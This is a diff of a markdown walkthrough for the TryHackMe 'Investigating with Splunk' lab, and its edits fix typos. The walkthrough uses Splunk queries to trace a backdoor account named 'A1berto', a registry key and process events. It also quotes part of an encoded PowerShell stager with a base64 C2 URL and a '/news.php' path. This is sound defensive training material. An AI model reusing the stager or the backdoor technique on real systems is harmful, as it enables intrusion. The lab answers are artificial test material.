@@ -1,8 +1,8 @@
-# "Investigating with Splunk" - TryHackMe Challange
+# "Investigating with Splunk" - TryHackMe Challenge
 
-#### We will be working on a closed environment using only Splunk provided with already harvested logs. Scenario goes as follows
+## We will be working on a closed environment using only Splunk provided with already harvested logs. Scenario goes as follows
 
-<mark>SOC Analyst Johny has observed some anomalous behaviours in the logs of a few windows machines. It looks like the adversary has access to some of these machines and successfully created some backdoor. His manager has asked him to pull those logs from suspected hosts and ingest them into Splunk for quick investigation. Our task as SOC Analyst is to examine the logs and identify the anomalies. </mark>
+> SOC Analyst Johny has observed some anomalous behaviours in the logs of a few windows machines. It looks like the adversary has access to some of these machines and successfully created some backdoor. His manager has asked him to pull those logs from suspected hosts and ingest them into Splunk for quick investigation. Our task as SOC Analyst is to examine the logs and identify the anomalies.
 
 ### Q1: How many events were collected and Ingested in the index main?
 
@@ -30,7 +30,7 @@ Newly created account name is:
 
 ### Q3: On the same host, a registry key was also updated regarding the new backdoor user. What is the full path of that registry key?
 
-I am not that familiar with Event ID's yet, so a quick search reveals that <mark>ID=13</mark> identifies Registry Value Set (source: [www.ultimatewindowssecurity.com](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90013)). Searching for ```index=main EventID="13" | search A1berto```
+I am not that familiar with Event ID's yet, so a quick search reveals that **ID=13** identifies Registry Value Set (source: [www.ultimatewindowssecurity.com](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90013)). Searching for ```index=main EventID="13" | search A1berto```
 
 ![Anser_3](screenshots/ans3.png)
 
@@ -38,7 +38,7 @@ Full path of registry key is
 
 > HKLM\\SAM\\SAM\\Domains\\Account\\Users\\Names\\A1berto\\
 
-### Q4: Examine the logs and identify the user that the adversary was trying to impersonate.
+### Q4: Examine the logs and identify the user that the adversary was trying to impersonate
 
 When i look for other users from selected fields we can see that adversary cleverly changed letter **l** to **1**.
 
@@ -53,7 +53,7 @@ Answer is
 In order to add a user, some kind of command was executed via a windows process.
 
 * Process creation ID is 4688
-* Backdor user's name is Alberto
+* Backdoor user's name is Alberto
 
 Based on the above points let's start with a query `index=main EventID="4688" | search A1berto` and there we have it
 
@@ -122,10 +122,10 @@ index=main | search EventID="4103" OR EventID="4104" | rex field=ContextInfo "Ho
 ![Query_powershel](screenshots/ans8d.png)
 
 Execution of powershell.exe with **-enc**, means that message is encoded in Base64.  
-When copied to Cyber Chef and removing null bytes got some resemblance of URL 
+When copied to Cyber Chef and removing null bytes got some resemblance of URL
 
 ``
-FroMBASe64StRInG('aAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1AA==')));$t='/news.php' 
+FroMBASe64StRInG('aAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1AA==')));$t='/news.php'
 ``
 
 So i tried to it decode once more
